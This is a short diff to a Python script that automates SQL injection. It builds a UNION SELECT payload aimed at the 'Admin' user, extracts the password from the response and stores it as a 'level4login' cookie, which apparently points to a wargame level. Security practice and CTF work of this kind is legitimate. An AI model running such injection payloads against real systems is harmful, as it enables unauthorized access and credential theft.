@@ -104,7 +104,7 @@ def main():
     else:
         print('too small visible list')
         exit(1)
-    keys = tg.find_param(url, list_of_columns, list_of_visible, html_visible,
+    keys = tg.find_param(url, len(finds), html_visible,
                          f"' union select {','.join(list_of_columns)} from {base_name} where username='Admin' #", 'usr', cook, fun)
 
     # Authorization
@@ -115,6 +115,7 @@ def main():
     passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
     print('password:', passw)
 
+    # Save cookie
     if ('level4login' not in cooks) or (cooks['level4login'] != passw):
         cooks['level4login'] = passw
         tg.save_cookies(cooks)
